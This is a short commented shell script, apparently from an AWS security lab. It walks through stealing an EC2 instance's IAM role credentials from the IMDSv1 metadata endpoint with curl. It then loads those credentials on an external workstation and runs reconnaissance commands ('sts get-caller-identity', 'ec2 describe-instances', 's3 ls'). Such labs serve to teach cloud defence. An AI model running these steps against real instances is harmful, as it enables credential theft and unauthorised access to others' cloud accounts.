# ------------------------------------------------------------------------------
# STEP 1: RECONNAISSANCE & CREDENTIAL EXFILTRATION (Compromised EC2 Instance A)
# Connect to EC2 via SSM Session Manager or SSH
# ------------------------------------------------------------------------------

# Query the local Instance Metadata Service (IMDSv1) to identify attached IAM role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Retrieve temporary security credentials (AccessKeyId, SecretAccessKey, Token) for the role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/A4L-InstanceRole


# ------------------------------------------------------------------------------
# STEP 2: EXTERNAL THREAT VECTOR / ATTACKER SIMULATION (Workstation Terminal)
# Simulating an attacker using stolen temporary credentials on an external machine
# ------------------------------------------------------------------------------

# Set environment variables using the exfiltrated temporary credentials
# (For Windows Command Prompt)
SET AWS_ACCESS_KEY_ID=ASIA...
SET AWS_SECRET_ACCESS_KEY=...
SET AWS_SESSION_TOKEN=...


# Verify caller identity to confirm stolen role context
aws sts get-caller-identity

# Abuse stolen permissions to recon AWS resources remotely
aws ec2 describe-instances --region us-east-1
aws s3 ls
